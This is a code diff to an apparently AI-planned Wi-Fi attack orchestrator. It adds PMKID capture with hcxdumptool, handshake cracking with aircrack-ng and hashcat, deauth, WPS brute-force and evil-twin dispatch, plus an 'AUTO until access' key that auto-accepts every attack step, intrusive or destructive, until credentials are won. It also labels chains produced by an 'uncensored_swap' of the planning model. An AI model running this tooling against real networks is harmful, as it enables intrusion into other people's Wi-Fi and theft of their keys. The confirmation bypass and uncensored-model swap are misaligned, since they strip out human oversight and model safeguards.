@@ -35,13 +35,25 @@ class TuiConfirmFn:
     The orchestrator worker thread calls ``confirm(prompt)`` which enqueues
     the prompt and blocks on a result queue. The curses main loop must call
     ``poll(stdscr)`` each frame: it renders the pending prompt (if any) and,
-    on ENTER/CANCEL, puts the answer back so the worker unblocks.
+    on ENTER/CANCEL/AUTO, puts the answer back so the worker unblocks.
+
+    Three operator answers:
+      * **ACCEPT** (``y`` / ENTER) — run this step only; ask again next time.
+      * **CANCEL** (``n`` / ESC) — skip this step (default-deny on timeout).
+      * **AUTO** (``a``) — accept *this* step and auto-ACCEPT every further
+        confirm until access is achieved (or ``clear_auto()`` is called).
+        One keystroke for the whole path to access; nested tool confirms
+        (crack, pmkid, …) also auto-pass while the flag is set.
     """
 
     def __init__(self):
         self.pending = queue.Queue()  # items: {"prompt","answer","id"}
         self._current: Optional[Dict[str, Any]] = None
         self._lock = threading.Lock()  # guards _current + pending drain/requeue
+        # One-shot autonomous mode: set by respond_auto() / key 'a'.
+        # While True, confirm() returns True without prompting. Cleared by
+        # clear_auto() (engagement start, or when access is achieved).
+        self.auto_until_access: bool = False
 
     def confirm(self, prompt: str, timeout: float = 300.0) -> bool:
         """Called from a worker thread. Blocks until the TUI answers.
@@ -54,7 +66,14 @@ class TuiConfirmFn:
         On timeout the prompt is removed from the queue / cleared from
         ``_current`` so it cannot later steal an operator's keystroke meant
         for a *different* prompt (the stale-prompt-poisoning bug).
+
+        When ``auto_until_access`` is set (operator pressed ``a``), returns
+        True immediately without enqueuing a prompt.
         """
+        if self.auto_until_access:
+            logger.info("confirm() auto-ACCEPT (auto_until_access): %s", prompt[:160])
+            return True
+
         ans_q: queue.Queue = queue.Queue()
         entry = {"prompt": prompt, "answer": ans_q, "id": id(ans_q)}
         self.pending.put(entry)
@@ -62,7 +81,7 @@ class TuiConfirmFn:
         try:
             while True:
                 try:
-                    return bool(ans_q.get(timeout=0.5))
+                    raw = ans_q.get(timeout=0.5)
                 except queue.Empty:
                     if time.monotonic() >= deadline:
                         logger.warning(
@@ -70,6 +89,17 @@ class TuiConfirmFn:
                             timeout, prompt,
                         )
                         return False
+                    continue
+                # "auto" is put by respond_auto(); treat as ACCEPT + latch.
+                if raw == "auto" or raw == "a":
+                    with self._lock:
+                        self.auto_until_access = True
+                    logger.info(
+                        "confirm() AUTO→access engaged by operator: %s",
+                        prompt[:160],
+                    )
+                    return True
+                return bool(raw)
         finally:
             # Best-effort cleanup so a timed-out prompt never poisons the
             # queue or steals a later operator response.
@@ -98,8 +128,8 @@ class TuiConfirmFn:
         Renders any pending prompt. Returns one of:
           - None (no prompt pending, or prompt just shown — keep showing)
           - "prompt:<text>" (a prompt is active; caller should render it)
-        The caller handles key input (ENTER=yes, 'n'/CANCEL=no) and calls
-        ``respond(True/False)``.
+        The caller handles key input (ENTER=yes, 'n'/CANCEL=no, 'a'=auto
+        until access) and calls ``respond(True/False)`` or ``respond_auto()``.
         """
         with self._lock:
             if self._current is None and not self.pending.empty():
@@ -135,9 +165,40 @@ class TuiConfirmFn:
             answer,
         )
 
+    def respond_auto(self) -> None:
+        """ACCEPT this step and latch auto-ACCEPT until access / clear_auto.
+
+        Operator pressed ``a``. Puts the sentinel ``\"auto\"`` on the answer
+        queue so ``confirm()`` both returns True and sets
+        ``auto_until_access``. Stale keystrokes (no active prompt) are
+        dropped the same way as ``respond``.
+        """
+        with self._lock:
+            if self._current is not None:
+                self._current["answer"].put("auto")
+                self._current = None
+                return
+        logger.warning(
+            "respond_auto() with no active prompt — dropped (stale keystroke).",
+        )
+
+    def clear_auto(self) -> bool:
+        """Clear the auto-until-access latch. Returns True if it was set."""
+        with self._lock:
+            was = self.auto_until_access
+            self.auto_until_access = False
+            return was
+
     def has_pending(self) -> bool:
         with self._lock:
             return self._current is not None or not self.pending.empty()
+
+
+def _confirm_owner(confirm_fn: Optional[Callable]) -> Optional[Any]:
+    """Return the ``TuiConfirmFn`` instance behind a bound ``.confirm``, if any."""
+    if confirm_fn is None:
+        return None
+    return getattr(confirm_fn, "__self__", None)
 
 
 def _default_deny(prompt: str) -> bool:
@@ -248,6 +309,12 @@ class AutonomousOrchestrator:
                 behavior so existing call sites are unchanged.
         """
         self._emit(f"[*] Orchestrator: {domain} engagement on {seed.get('ssid') or seed.get('name') or seed.get('target') or seed}")
+        # Fresh engagement: drop any leftover AUTO→access latch so a prior
+        # run cannot silently auto-ACCEPT steps the operator never saw.
+        owner = _confirm_owner(self.confirm_fn)
+        if owner is not None and hasattr(owner, "clear_auto"):
+            if owner.clear_auto():
+                self._emit("[i] cleared leftover AUTO→access from previous engagement")
         report: Dict[str, Any] = {
             "domain": domain, "seed": seed,
             "ai_plan": None, "kb_tools": [],
@@ -264,6 +331,7 @@ class AutonomousOrchestrator:
             # to trigger auto post-exploit + an interactive target shell.
             "access": {"achieved": False, "creds": None, "session_id": None},
             "replans": 0,  # number of live re-plans performed this run
+            "auto_until_access": False,  # operator pressed 'a' during this run
         }
 
         # 1) AI plan via the shared backend (real Ollama/Groq/heuristic)
@@ -309,6 +377,12 @@ class AutonomousOrchestrator:
                     f"[!] AI chain {source}; falling back to legacy hardcoded ladder"
                 )
                 steps = self._build_steps(domain, seed, report)
+                # Keep re-plan enabled: the planner is still wired and
+                # can adapt the remaining tail after each real step.
+                # Mark source so report reflects the fallback origin
+                # while the walk still uses the polymorphic loop.
+                report["ai_chain_source"] = f"legacy_fallback_from_{source}"
+                source = "legacy_fallback"
         else:
             steps = self._build_steps(domain, seed, report)
             source = "legacy"
@@ -317,9 +391,10 @@ class AutonomousOrchestrator:
         # re-queried with the live ``report["executed"]`` as
         # ``prior_results`` so it can propose the NEXT 1-3 steps adjusted
         # to the real outcome (failed crack → alternate path; access
-        # achieved → post_exploit/open_shell). The legacy ladder path
-        # keeps the original static walk (no planner wired).
-        if use_ai_chain and self.chain_planner is not None and source != "legacy":
+        # achieved → post_exploit/open_shell). Pure legacy (no planner /
+        # use_ai_chain=False) keeps the original static walk.
+        if (use_ai_chain and self.chain_planner is not None
+                and source != "legacy"):
             self._walk_chain_with_replan(
                 steps, seed, report, domain=domain,
                 autonomous=autonomous, attach_zero_day=attach_zero_day,
@@ -442,6 +517,7 @@ class AutonomousOrchestrator:
                 "access",
                 {"achieved": False, "creds": None, "session_id": None},
             )
+            was_achieved = bool(access.get("achieved"))
             result = entry.get("result") if isinstance(entry, dict) else None
             data = None
             if isinstance(result, dict):
@@ -461,6 +537,21 @@ class AutonomousOrchestrator:
                         access["achieved"] = True
                         access["creds"] = v
                         break
+            # Operator pressed 'a' (AUTO→access): once access lands, drop
+            # the latch so post-exploit / shell / optional tails prompt
+            # again. One decision gets you to the foothold; further
+            # destructive work still needs an explicit ACCEPT (or another
+            # 'a').
+            if access.get("achieved") and not was_achieved:
+                owner = _confirm_owner(self.confirm_fn)
+                if owner is not None and getattr(owner, "auto_until_access", False):
+                    if hasattr(owner, "clear_auto") and owner.clear_auto():
+                        report["auto_until_access"] = True  # was used this run
+                        self._emit(
+                            "[i] access achieved — AUTO→access cleared; "
+                            "further steps will prompt again "
+                            "(y ACCEPT / n CANCEL / a AUTO)"
+                        )
         except Exception:  # noqa: BLE001
             logger.debug("access record failed", exc_info=True)
 
@@ -542,6 +633,130 @@ class AutonomousOrchestrator:
     # Every helper returns a structured dict and never raises, so the
     # re-plan loop can inspect ``creds`` to detect "access achieved".
     # ------------------------------------------------------------------
+
+    def _stamp_cap_from_airodump_args(self, args: Dict[str, Any],
+                                      seed: Dict[str, Any]) -> None:
+        """After airodump-ng, promote the written .cap onto the seed.
+
+        airodump ``-w PREFIX`` produces ``PREFIX-01.cap``. Never raises.
+        """
+        try:
+            from pathlib import Path as _P
+            write = (args or {}).get("write") or (args or {}).get("output")
+            candidates = []
+            if write:
+                candidates.extend([
+                    f"{write}-01.cap", f"{write}.cap", f"{write}.pcap",
+                ])
+            bssid = str((args or {}).get("bssid")
+                        or seed.get("bssid") or "").replace(":", "")
+            if bssid:
+                candidates.append(f"/tmp/kfiosa-{bssid}-01.cap")
+            for c in candidates:
+                if c and _P(c).is_file():
+                    seed["cap_file"] = c
+                    seed["pcap"] = c
+                    self._emit(f"[+] capture path on seed: {c}")
+                    return
+        except Exception:  # noqa: BLE001
+            return
+
+    def _resolve_cap_file(self, step: Dict[str, Any],
+                          seed: Dict[str, Any]) -> Optional[str]:
+        """Locate a capture file for crack / pmkid / hashcat steps.
+
+        Order: step fields → step.args → seed → recon harvest paths.
+        Only returns a path that currently exists on disk (or the first
+        non-empty candidate when existence cannot be checked).
+        """
+        candidates: List[Any] = []
+        if isinstance(step, dict):
+            candidates.extend([
+                step.get("cap_file"), step.get("pcap"), step.get("capture"),
+            ])
+            args = step.get("args") if isinstance(step.get("args"), dict) else {}
+            candidates.extend([
+                args.get("cap_file"), args.get("pcap"), args.get("capture"),
+                args.get("write"),
+            ])
+            write = args.get("write")
+            if write:
+                candidates.append(f"{write}-01.cap")
+                candidates.append(f"{write}.cap")
+        if isinstance(seed, dict):
+            candidates.extend([
+                seed.get("cap_file"), seed.get("pcap"), seed.get("capture"),
+            ])
+            recon = seed.get("recon") if isinstance(seed.get("recon"), dict) else {}
+            for key in ("handshake_harvest", "eapol_monitor", "pmkid"):
+                data = ((recon.get(key) or {}).get("data") or {})
+                if isinstance(data, dict):
+                    candidates.extend([data.get("pcap"), data.get("cap_file")])
+            bssid = str(seed.get("bssid") or "").replace(":", "")
+            if bssid:
+                candidates.append(f"/tmp/kfiosa-{bssid}-01.cap")
+                candidates.append(f"/tmp/kfiosa_pmkid_{bssid}.pcap")
+        from pathlib import Path as _P
+        for c in candidates:
+            if not c:
+                continue
+            p = str(c)
+            # airodump write base without -01.cap
+            if not p.endswith((".cap", ".pcap", ".pcapng", ".hc22000")):
+                for ext in (f"{p}-01.cap", f"{p}.cap", f"{p}.pcap"):
+                    if _P(ext).is_file():
+                        return ext
+                continue
+            if _P(p).is_file():
+                return p
+        # Return first non-empty path even if missing so callers can
+        # emit an honest "not found" rather than "no cap_file".
+        for c in candidates:
+            if c:
+                return str(c)
+        return None
+
+    def _capture_pmkid_pcap(self, *, iface: str, bssid: str,
+                            channel: Any = "",
+                            seed: Optional[Dict[str, Any]] = None,
+                            timeout: int = 30) -> Optional[str]:
+        """Best-effort hcxdumptool PMKID capture. Returns pcap path or None.
+
+        Never raises. On success also stamps ``seed['cap_file']``.
+        """
+        import shutil
+        import subprocess
+        from pathlib import Path as _P
+        if not shutil.which("hcxdumptool"):
+            return None
+        b_clean = str(bssid or "").replace(":", "").upper()
+        out = _P(f"/tmp/kfiosa_pmkid_{b_clean or 'cap'}.pcap")
+        filter_file = _P(f"/tmp/kfiosa_pmkid_{b_clean or 'cap'}.filter")
+        try:
+            # hcxdumptool wants clientless filter form for a single AP.
+            filter_file.write_text(f"{bssid}\n", encoding="utf-8")
+        except Exception:  # noqa: BLE001
+            pass
+        cmd = [
+            "hcxdumptool", "-i", str(iface),
+            "-w", str(out),
+            "--enable_status=1",
+        ]
+        if channel not in (None, "", 0, "0"):
+            # Some hcxdumptool builds use -c / --filtermode; best-effort.
+            cmd.extend(["-c", str(channel)])
+        if filter_file.is_file():
+            cmd.extend(["--filterlist_ap", str(filter_file)])
+        try:
+            subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        except Exception:  # noqa: BLE001
+            return None
+        if out.is_file() and out.stat().st_size > 0:
+            if isinstance(seed, dict):
+                seed["cap_file"] = str(out)
+                seed["pcap"] = str(out)
+            return str(out)
+        return None
 
     def _resolve_wordlist(self, seed: Dict[str, Any],
                           report: Optional[Dict[str, Any]] = None,
@@ -751,15 +966,17 @@ class AutonomousOrchestrator:
             return ([], "failed")
         if not steps:
             return ([], "empty")
-        # Try to detect the source by looking at the planner's
-        # internal flag (set during uncensored-swap); default to "llm"
-        # since heuristic is the planner's last resort and emits
-        # parseable steps too.
+        # Prefer the planner's explicit chain_source (llm | uncensored_swap
+        # | heuristic). Fall back to uncensored_swap flag, then "llm".
+        # Without this, heuristic chains were mislabeled source=llm.
         source = "llm"
         try:
             ctx = getattr(self.chain_planner, "_last_context", None) or {}
-            if ctx.get("uncensored_swap"):
-                source = "uncensored_swap"
+            source = (
+                ctx.get("chain_source")
+                or ("uncensored_swap" if ctx.get("uncensored_swap") else None)
+                or "llm"
+            )
         except Exception:
             pass
         self._emit(
@@ -784,10 +1001,25 @@ class AutonomousOrchestrator:
         kind = step.get("kind", "real")
         desc = step["desc"]
         self._emit(f"[*] STEP ({kind}): {desc}")
-        if autonomous:
+        owner = _confirm_owner(self.confirm_fn)
+        if autonomous or (
+            owner is not None and getattr(owner, "auto_until_access", False)
+        ):
+            if owner is not None and getattr(owner, "auto_until_access", False):
+                report["auto_until_access"] = True
+                self._emit(f"[*] AUTO→access: auto-ACCEPT step: {desc}")
             accept = True
         else:
-            accept = self.confirm_fn(f"ACCEPT step? {desc}")
+            accept = self.confirm_fn(
+                f"ACCEPT step? {desc}\n"
+                f"  [y] this step  [n] skip  [a] AUTO until access"
+            )
+            if owner is not None and getattr(owner, "auto_until_access", False):
+                report["auto_until_access"] = True
+                self._emit(
+                    "[i] AUTO→access ON — remaining steps auto-ACCEPT "
+                    "until access (creds/session) is achieved"
+                )
         if not accept:
             self._emit(f"[-] CANCELLED: {desc}")
             report["skipped"].append(desc)
@@ -884,10 +1116,12 @@ class AutonomousOrchestrator:
             if new_steps is None:
                 i += 1
                 continue
-            # Dedup: drop leading new steps whose (action, tool) we have
-            # already walked, so we don't repeat a just-failed step.
-            while new_steps and self._executed_sig(new_steps[0]) in done_sigs:
-                new_steps.pop(0)
+            # Dedup: drop any newly-proposed steps whose (action, tool)
+            # already ran (not only leading — planner may reshuffle).
+            new_steps = [
+                s for s in new_steps
+                if self._executed_sig(s) not in done_sigs
+            ]
             if not new_steps:
                 no_change += 1
                 if no_change >= NO_CHANGE_LIMIT:
@@ -906,8 +1140,18 @@ class AutonomousOrchestrator:
                 f"[i] polymorphic re-plan #{replans}: splicing "
                 f"{len(new_steps)} new step(s) into the chain"
             )
-            # Replace the remaining tail with the live proposal.
-            steps = steps[:i + 1] + new_steps
+            # Replace the remaining tail with the live proposal, but
+            # keep any not-yet-walked original steps that the re-plan
+            # did not re-emit (so a short re-plan does not drop
+            # later crack/pmkid steps from the initial plan).
+            remaining_orig = [
+                s for s in steps[i + 1:]
+                if self._executed_sig(s) not in done_sigs
+                and self._executed_sig(s) not in {
+                    self._executed_sig(x) for x in new_steps
+                }
+            ]
+            steps = steps[:i + 1] + new_steps + remaining_orig
             i += 1
 
     def _replan(self, domain: str, seed: Dict[str, Any],
@@ -997,7 +1241,22 @@ class AutonomousOrchestrator:
         except Exception as e:  # noqa: BLE001
             self._emit(f"[i] kismet prechain: import failed; skipping ({e})")
             return
-        target = seed.get("target") if isinstance(seed, dict) else None
+        # WiFi AIO seeds ARE the AP dict (bssid/ssid at top level). Nested
+        # ``seed["target"]`` is only used by some OSINT / host shapes.
+        # Prefer nested target when present; otherwise treat seed itself
+        # as the target when it carries identity fields.
+        target = None
+        if isinstance(seed, dict):
+            nested = seed.get("target")
+            if isinstance(nested, dict) and (
+                nested.get("bssid") or nested.get("ssid")
+                or nested.get("address") or nested.get("mac")
+            ):
+                target = nested
+            elif (seed.get("bssid") or seed.get("ssid")
+                  or seed.get("address") or seed.get("mac")
+                  or seed.get("BSSID")):
+                target = seed
         if not isinstance(target, dict):
             self._emit("[i] kismet prechain: no target in seed; skipping")
             return
@@ -1027,7 +1286,8 @@ class AutonomousOrchestrator:
         if n <= 0:
             self._emit("[i] kismet prechain: no matching capture; skipping")
             return
-        # Merge into seed.target.recon so the planner can ingest it.
+        # Merge into seed.recon (or seed.target.recon) so the planner can
+        # ingest it. Always write onto the resolved ``target`` dict.
         target_recon = target.setdefault("recon", {})
         if not isinstance(target_recon, dict):
             target_recon = {}
@@ -1559,8 +1819,7 @@ class AutonomousOrchestrator:
         Propagates a recovered PSK via ``data={"creds": ...}`` so
         :meth:`_record_access` flips ``report["access"]``. Never raises."""
         args = step.get("args", {}) or {}
-        pcap = (args.get("cap_file") or args.get("pcap")
-                or seed.get("cap_file") or seed.get("pcap"))
+        pcap = self._resolve_cap_file(step, seed)
         bssid = args.get("bssid") or seed.get("bssid")
         wep = bool(args.get("wep") or seed.get("wep"))
         wordlist = self._resolve_wordlist(
@@ -1570,6 +1829,15 @@ class AutonomousOrchestrator:
         if not pcap:
             self._emit("[!] crack: no cap_file in args/seed; skipping")
             report["skipped"].append("crack: no cap_file")
+            return
+        from pathlib import Path as _P
+        if not _P(pcap).is_file():
+            self._emit(f"[!] crack: cap_file missing on disk: {pcap}")
+            report["skipped"].append(f"crack: missing {pcap}")
+            entry = {"desc": desc, "kind": "ai", "action": "crack",
+                     "tool": "aircrack-ng",
+                     "result": {"ok": False, "error": f"cap missing: {pcap}"}}
+            report["executed"].append(entry)
             return
         res = self._crack_with_aircrack(pcap, wordlist, bssid=bssid, wep=wep)
         self._emit(
@@ -1587,18 +1855,35 @@ class AutonomousOrchestrator:
         """AI ``pmkid`` step: clientless PMKID capture+crack via hashcat
         ``-m 22000``. Propagates the recovered PSK. Never raises."""
         args = step.get("args", {}) or {}
-        pcap = (args.get("cap_file") or args.get("pcap")
-                or seed.get("cap_file"))
+        pcap = self._resolve_cap_file(step, seed)
         hash_file = args.get("hash_file")
         bssid = args.get("bssid") or seed.get("bssid")
+        iface = (args.get("interface") or args.get("iface")
+                 or seed.get("interface") or self.interface)
+        ch = args.get("channel") or seed.get("channel") or ""
         wordlist = self._resolve_wordlist(
             seed, report, prefer=args.get("wordlist"))
+        # Capture first when no usable pcap is on disk.
+        from pathlib import Path as _P
+        if (not hash_file) and (not pcap or not _P(str(pcap)).is_file()):
+            if bssid and iface:
+                self._emit(
+                    f"[*] pmkid: no cap yet — trying hcxdumptool on "
+                    f"{bssid} via {iface}"
+                )
+                pcap = self._capture_pmkid_pcap(
+                    iface=iface, bssid=bssid, channel=ch, seed=seed)
         if not hash_file and pcap:
             hash_file = self._pcap_to_hc22000(pcap)
         desc = f"pmkid hashcat -m 22000 {os.path.basename(hash_file) if hash_file else '?'}"
         if not hash_file:
             self._emit("[!] pmkid: no hash_file/cap_file; skipping")
             report["skipped"].append("pmkid: no hash file")
+            entry = {"desc": desc, "kind": "ai", "action": "pmkid",
+                     "tool": "hashcat",
+                     "result": {"ok": False,
+                                "error": "pmkid: no hash_file/cap_file"}}
+            report["executed"].append(entry)
             return
         res = self._crack_with_hashcat(
             hash_file, wordlist=wordlist, mode="22000", attack_mode=0,
@@ -1619,8 +1904,7 @@ class AutonomousOrchestrator:
         only a capture is available. Propagates the recovered PSK. Never
         raises."""
         args = step.get("args", {}) or {}
-        pcap = (args.get("cap_file") or args.get("pcap")
-                or seed.get("cap_file"))
+        pcap = self._resolve_cap_file(step, seed)
         hash_file = args.get("hash_file")
         mask = args.get("mask") or "?d?d?d?d?d?d?d?d"
         if not hash_file and pcap:
@@ -1629,6 +1913,12 @@ class AutonomousOrchestrator:
         if not hash_file:
             self._emit("[!] crack_gpu: no hash_file/cap_file; skipping")
             report["skipped"].append("crack_gpu: no hash file")
+            entry = {
+                "desc": desc, "kind": "ai", "action": "crack_gpu",
+                "tool": "hashcat",
+                "result": {"ok": False, "error": "crack_gpu: no hash_file/cap_file"},
+            }
+            report["executed"].append(entry)
             return
         res = self._crack_with_hashcat(
             hash_file, mask=mask, mode="22000", attack_mode=3, gpu=True)
@@ -2269,17 +2559,30 @@ class AutonomousOrchestrator:
         # ``{risk.upper()}`` substring is preserved either way so the
         # risk class is always visible (and existing risk-level tests
         # still match).
-        if not autonomous:
+        #
+        # Third answer: press 'a' (AUTO→access) — accept this step and
+        # auto-ACCEPT every further confirm until access is achieved
+        # (see TuiConfirmFn.auto_until_access). When the runtime
+        # ``autonomous`` flag is True, skip the prompt entirely.
+        owner = _confirm_owner(self.confirm_fn)
+        if owner is not None and getattr(owner, "auto_until_access", False):
+            report["auto_until_access"] = True
+            self._emit(
+                f"[*] AUTO→access: auto-ACCEPT {risk.upper()} step: {desc[:200]}"
+            )
+        elif not autonomous:
             if optional:
                 prompt = (
                     f"ACCEPT (OPTIONAL) {risk.upper()} step? {desc[:400]}"
                     + (f"\n  expected: {expected}" if expected else "")
                     + " — declining skips this optional step; the chain continues."
+                    + "\n  [y] this step  [n] skip  [a] AUTO until access"
                 )
             else:
                 prompt = (
                     f"ACCEPT {risk.upper()} step? {desc[:400]}"
                     + (f"\n  expected: {expected}" if expected else "")
+                    + "\n  [y] this step  [n] skip  [a] AUTO until access"
                 )
             accept = self.confirm_fn(prompt)
             if not accept:
@@ -2288,6 +2591,13 @@ class AutonomousOrchestrator:
                 if optional:
                     report["optional_declined"].append(desc)
                 return
+            # If the operator just latched AUTO via 'a', note it.
+            if owner is not None and getattr(owner, "auto_until_access", False):
+                report["auto_until_access"] = True
+                self._emit(
+                    "[i] AUTO→access ON — remaining steps auto-ACCEPT "
+                    "until access (creds/session) is achieved"
+                )
 
         # Dispatch on action.
         if action == "zero_day_propose":
@@ -2368,7 +2678,6 @@ class AutonomousOrchestrator:
         if action == "forensic_module":
             self._dispatch_forensic_module(step, seed, report)
             return
-            return
         if action == "post_exploit_probe":
             self._dispatch_post_exploit_probe(step, seed, report)
             return
@@ -2440,6 +2749,8 @@ class AutonomousOrchestrator:
                 try:
                     res = self.mcp_client.call(tool, args)
                     self._emit(f"[+] mcp_call {tool}: ok={res.get('ok')}")
+                    if tool in ("airodump-ng", "airodump"):
+                        self._stamp_cap_from_airodump_args(args or {}, seed)
                     entry = {
                         "desc": desc, "kind": "ai", "action": action,
                         "tool": tool, "result": res,
@@ -2454,25 +2765,67 @@ class AutonomousOrchestrator:
                     return
                 except Exception as e:
                     self._emit(f"[!] mcp_client.call({tool}) failed: {e}; falling through")
-            # No MCP client or the call raised — fall through to the
-            # legacy path which dispatches on the tool name. We map
-            # the AI step into a legacy-shaped step with ``desc`` so
-            # the existing _execute_step can do its job.
+            # Default path: registry'd MCP wrappers (airodump-ng, etc.).
+            # Without this, tool names like "airodump-ng" fell through to
+            # _execute_step as action labels and returned
+            # "unknown action: airodump-ng" — designed workflow broken.
+            try:
+                from core.mcp.tools import KALI_TOOL_WRAPPERS, call_mcp_tool
+                if tool and tool in KALI_TOOL_WRAPPERS:
+                    timeout = int(
+                        step.get("expected_runtime_seconds")
+                        or (args or {}).get("timeout")
+                        or 30
+                    )
+                    res = call_mcp_tool(tool, args or {}, timeout=timeout)
+                    self._emit(
+                        f"[+] mcp_call {tool}: ok={res.get('ok')} "
+                        f"via call_mcp_tool"
+                        + (f" err={res.get('error')}" if res.get("error") else "")
+                    )
+                    # Stamp capture path on seed after airodump so crack/
+                    # pmkid can resolve cap_file without planner luck.
+                    if tool in ("airodump-ng", "airodump"):
+                        self._stamp_cap_from_airodump_args(args or {}, seed)
+                    entry = {
+                        "desc": desc, "kind": "ai", "action": action,
+                        "tool": tool, "result": res,
+                    }
+                    report["executed"].append(entry)
+                    self._record_access(report, entry)
+                    return
+            except Exception as e:  # noqa: BLE001
+                self._emit(
+                    f"[!] call_mcp_tool({tool}) failed: {e}; "
+                    f"falling through to legacy"
+                )
+            # Legacy path: map known tool aliases into _execute_step
+            # action names (airodump-ng → airodump, etc.).
+            _TOOL_ACTION_ALIASES = {
+                "airodump-ng": "airodump",
+                "aireplay-ng": "deauth",
+                "aircrack-ng": "crack",
+            }
+            legacy_action = _TOOL_ACTION_ALIASES.get(tool or "", tool or "mcp_call")
             legacy_step = {
                 "desc": desc,
                 "kind": "real",
-                # _execute_step dispatches on these for the wifi case;
-                # the AI tool name is reused as the action label.
-                "action": tool or "mcp_call",
+                "action": legacy_action,
                 "tool": tool,
                 "args": args,
                 "bssid": args.get("bssid") or seed.get("bssid"),
                 "channel": args.get("channel") or seed.get("channel"),
                 "iface": args.get("interface") or args.get("iface") or self.interface,
                 "interface": args.get("interface") or args.get("iface") or self.interface,
-                "cap_file": args.get("cap_file") or args.get("output"),
+                "cap_file": (
+                    args.get("cap_file") or args.get("capture")
+                    or args.get("output") or args.get("write")
+                ),
                 "expected_runtime_seconds": step.get("expected_runtime_seconds"),
                 "external": risk in ("intrusive", "destructive"),
+                # Walk already ACCEPTed — do not re-prompt inside
+                # _execute_step (one gate per step).
+                "pre_accepted": True,
             }
             res = self._execute_step(legacy_step, seed)
             self._emit(f"[+] {tool or action}: {res}")
@@ -2483,20 +2836,83 @@ class AutonomousOrchestrator:
             report["executed"].append(entry)
             self._record_access(report, entry)
             return
-        # parse / decide / run_tool — fall through.
-        legacy_step = {
-            "desc": desc,
-            "kind": "real" if action == "run_tool" else "info",
-            "action": tool or action,
-            "tool": tool,
-            "args": args,
+        # Real wifi ladder actions the heuristic / LLM may emit as
+        # first-class ``action`` names (not only via mcp_call). Without
+        # this branch, ``deauth`` / ``airodump`` fell through to the
+        # info-only path and were silently never executed — so
+        # handshake-force deauth never ran after capture.
+        _LEGACY_WIFI_ACTIONS = {
+            "airodump", "airodump-ng", "deauth", "aireplay-ng",
+            "evil_twin", "evil_twin_capture", "block_client",
+            "wps_pixie", "wps_online", "crack", "pmkid",
+            "aircrack-ng", "handshake", "capture",
         }
-        if action == "run_tool":
+        if action in _LEGACY_WIFI_ACTIONS or action == "run_tool":
+            # Prefer dedicated AI dispatchers when present (crack/pmkid/
+            # wps already have them above). Anything left here is
+            # executed via the shared legacy step runner.
+            legacy_action = action if action != "run_tool" else (tool or action)
+            # Map tool-name / synonym aliases if the LLM put the binary
+            # or a colloquial name in action.
+            _ACTION_ALIASES = {
+                "airodump-ng": "airodump",
+                "aireplay-ng": "deauth",
+                "aircrack-ng": "crack",
+                "handshake": "airodump",
+                "capture": "airodump",
+            }
+            legacy_action = _ACTION_ALIASES.get(legacy_action, legacy_action)
+            legacy_step = {
+                "desc": desc,
+                "kind": "real",
+                "action": legacy_action,
+                "tool": tool,
+                "args": args,
+                "bssid": args.get("bssid") or seed.get("bssid") or step.get("bssid"),
+                "channel": (
+                    args.get("channel") or seed.get("channel")
+                    or step.get("channel")
+                ),
+                "iface": (
+                    args.get("interface") or args.get("iface")
+                    or seed.get("interface") or self.interface
+                ),
+                "interface": (
+                    args.get("interface") or args.get("iface")
+                    or seed.get("interface") or self.interface
+                ),
+                "ssid": args.get("ssid") or seed.get("ssid"),
+                "cap_file": (
+                    args.get("cap_file") or args.get("pcap")
+                    or args.get("capture") or args.get("write")
+                    or seed.get("cap_file")
+                ),
+                "pcap": args.get("pcap") or args.get("cap_file") or seed.get("pcap"),
+                "write": args.get("write"),
+                "client": args.get("client") or args.get("station"),
+                "expected_runtime_seconds": step.get("expected_runtime_seconds"),
+                "external": risk in ("intrusive", "destructive"),
+                "pre_accepted": True,
+            }
             res = self._execute_step(legacy_step, seed)
-        else:
-            # parse / decide are info-only
-            res = f"(info, not executed) {action}"
-            self._emit(f"[i] {res}")
+            # Stamp capture if airodump produced one.
+            if legacy_action == "airodump":
+                if isinstance(res, dict) and res.get("cap_file"):
+                    seed["cap_file"] = res["cap_file"]
+                    seed["pcap"] = res["cap_file"]
+                else:
+                    self._stamp_cap_from_airodump_args(args or {}, seed)
+            self._emit(f"[+] {action}: {res}")
+            entry = {
+                "desc": desc, "kind": "ai", "action": action,
+                "tool": tool or legacy_action, "result": res,
+            }
+            report["executed"].append(entry)
+            self._record_access(report, entry)
+            return
+        # parse / decide / unknown — info-only (never fake a real attack).
+        res = f"(info, not executed) {action}"
+        self._emit(f"[i] {res}")
         entry = {
             "desc": desc, "kind": "ai", "action": action,
             "tool": tool, "result": res,
@@ -4484,20 +4900,24 @@ class AutonomousOrchestrator:
             ch = seed.get("channel") or "<ch>"
             iface = seed.get("interface") or self.interface or "<monitor_iface>"
             ssid = seed.get("ssid") or "<ssid>"
+            cap_default = f"/tmp/kfiosa-{str(bssid).replace(':', '')}-01.cap"
+            # Prefer recon/seed pcap when already harvested.
+            cap_seed = seed.get("cap_file") or seed.get("pcap") or cap_default
             steps = [
                 {"kind": "real", "desc": f"airodump-ng capture {bssid} ch{ch} on {iface}",
-                 "action": "airodump", "iface": iface, "bssid": bssid, "channel": ch},
-                {"kind": "real", "desc": f"PMKID capture via hcxdumptool on {bssid} ch{ch}",
-                 "action": "pmkid", "bssid": bssid, "channel": ch,
-                 "pcap": f"/tmp/kfiosa_pmkid_{bssid.replace(':', '')}.pcap"},
+                 "action": "airodump", "iface": iface, "bssid": bssid, "channel": ch,
+                 "write": f"/tmp/kfiosa-{str(bssid).replace(':', '')}"},
                 {"kind": "real", "desc": f"aireplay-ng deauth {bssid} (force handshake)",
-                 "action": "deauth", "iface": iface, "bssid": bssid},
+                 "action": "deauth", "iface": iface, "bssid": bssid, "channel": ch},
+                {"kind": "real", "desc": f"PMKID capture via hcxdumptool on {bssid} ch{ch}",
+                 "action": "pmkid", "bssid": bssid, "channel": ch, "iface": iface,
+                 "pcap": cap_seed},
                 {"kind": "real", "desc": f"WPS Pixie-Dust on {bssid} via {iface}",
                  "action": "wps_pixie", "iface": iface, "bssid": bssid},
                 {"kind": "real", "desc": f"WPS online PIN brute (bully) on {bssid}",
                  "action": "wps_online", "iface": iface, "bssid": bssid},
                 {"kind": "real", "desc": "hashcat -m 22000 crack captured handshake",
-                 "action": "crack"},
+                 "action": "crack", "cap_file": cap_seed, "bssid": bssid},
                 {"kind": "real", "desc": f"hostapd + dnsmasq evil-twin '{ssid}' on {iface}",
                  "action": "evil_twin_capture", "iface": iface, "ssid": ssid,
                  "channel": ch},
@@ -4577,6 +4997,17 @@ class AutonomousOrchestrator:
         return r.get("status") or r.get("error") or "done"
 
     # ------------------------------------------------------------------
